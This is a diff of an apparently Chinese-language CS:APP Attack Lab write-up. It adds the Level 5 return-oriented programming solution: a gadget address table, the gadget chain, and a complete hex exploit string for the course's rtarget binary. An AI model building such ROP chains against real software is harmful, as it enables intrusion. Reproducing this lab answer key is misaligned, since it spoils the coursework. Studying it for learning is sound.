@@ -10,9 +10,9 @@ There is some of the same fitness in a man's building his own house that there i
 
 利用缓冲区溢出，完成代码注入与面向返回指令的攻击，深化理解栈机制。
 
-使用 ctarget/rtarget 时，添加 -q 指令避免向服务器请求打分。
+使用 ctarget/rtarget 时，添加 -q 指令避免向服务器请求打分，添加 -i 指令读取文件为输入。
 
-总体上有五个实验阶段。
+总体上有五个实验阶段，实验代码[见此](https://github.com/QifanWang/learning-csapp/tree/master/handout/target1)。
 
 ## Level 1
 
@@ -150,7 +150,59 @@ ec 17 40 00 00 00 00 00 /* touch2 start address */
 
 ## Level 5
 
-待续。
+本阶段的目标同 Level 3 一样，只是需要通过抽取 gadget 完成参数赋值。而且由于栈随机化，不能直接传栈地址作为字符串开始地址。
+
+先看下我们能够使用的 gadget 都是什么指令，
+
+function | start address | gadget address | instruction
+--- | --- | --- | ---
+addval_273 | 0x4019a0 | 0x4019a2 | movq %rax, %rdi
+addval_219 | 0x4019a7 | 0x4019ab | popq %rax
+setval_426 | 0x4019c3 | 0x4019c5 | movq %rax, %rdi
+getval_280 | 0x4019ca | 0x4019cc | popq %rax
+add_xy | 0x4019d6 | 0x4019d6 | lea (%rdi,%rsi,1),%rax
+getval_481 | 0x4019db | 0x4019dd | movl %eax, %edx
+addval_190 | 0x401a03 | 0x401a06 | movq %rsp, %rax
+addval_436 | 0x401a11 | 0x401a13 | movl %ecx, %esi
+addval_187 | 0x401a25 | 0x401a27 | movl %ecx, %esi
+getval_159 | 0x401a33 | 0x401a34 | movl %edx, %ecx
+addval_487 | 0x401a40 | 0x401a42 | movl %eax, %edx
+getval_311 | 0x401a68 | 0x401a69 | movl %edx, %ecx
+addval_358 | 0x401a83 | 0x401a86 | movl %esp, %eax
+setval_350 | 0x401aab | 0x401aad | movq %rsp, %rax
+
+由于栈随机化，指令`movq %rax, %rdi` 与 `movq %rsp, %rax` 是必要的，因为只有这两个指令完成参数(第一个参数)赋值与得到栈地址。但只用这两个指令肯定不行，因为每执行一次 gadget 都会有 retq 导致栈空间变化。于是我们需要构造一个“距离”，这个可以借助指令`popq %rax`完成，再通过传递并调用指令`lea (%rdi,%rsi,1),%rax`得到字符串开始地址。
+
+使用 gadget 如下(ignoring nop and functional op)，
+{% highlight nasm %}
+popq %rax ; the value to rsi store in rax
+movl %eax, %edx
+movl %edx, %ecx
+movl %ecx, %esi ; rsi gets the distance value
+movq %rsp, %rax ; the address that rdi will get
+movq %rax, %rdi
+lea (%rdi, %rsi, 1), %rax
+movq %rax, %rdi ; rdi gets char array start address
+{% endhighlight %}
+
+
+构造的 exploit string 的十六进制表示，
+{% highlight nasm %}
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
+ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
+20 00 00 00 00 00 00 00 /* distance value to %rax : 0x20(32), final to rsi */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx instruction address 0x4019dd */
+34 1a 40 00 00 00 00 00 /* movl %edx, %ecx instruction address 0x401a34 */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi instruction address 0x401a13 */
+06 1a 40 00 00 00 00 00 /* movq %rsp, %rax instruction address 0x401a06 */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax instruction address 0x4019d6 */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+fa 18 40 00 00 00 00 00 /* touch3 start address 0x4018fa */
+35 39 62 39 39 37 66 61 00 /* cookie 59b997fa ASCII value */
+{% endhighlight %}
+
+网络上有拆出 add 指令构造距离的做法，但我在这里还是按照实验文件列出的指令进行实验，寻找 gadget 略耗费时间但最终还是PASS了。
 
 ## Conclusions
 
@@ -160,12 +212,11 @@ ec 17 40 00 00 00 00 00 /* touch2 start address */
 
 通过 Level 4 我们可以看到，如何绕过两种防止缓冲区溢出攻击的机制，即通过已有代码的片段(gadget)改变程序行为。
 
-{% highlight nasm %}
-
-{% endhighlight %}
+通过 Level 5 我们可以看到挖掘与组合各种 gadget 可以改变多种多样的程序行为。
 
 ## Reference
 1. [CS:APP Lab Assignments](http://csapp.cs.cmu.edu/3e/labs.html)
 2. [attack lab readme](http://csapp.cs.cmu.edu/3e/README-attacklab)
 3. [attack lab writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
 4. [Beej's Quick Guide to GDB](http://beej.us/guide/bggdb/)
+5. [My Solution](https://github.com/QifanWang/learning-csapp/tree/master/handout/target1)
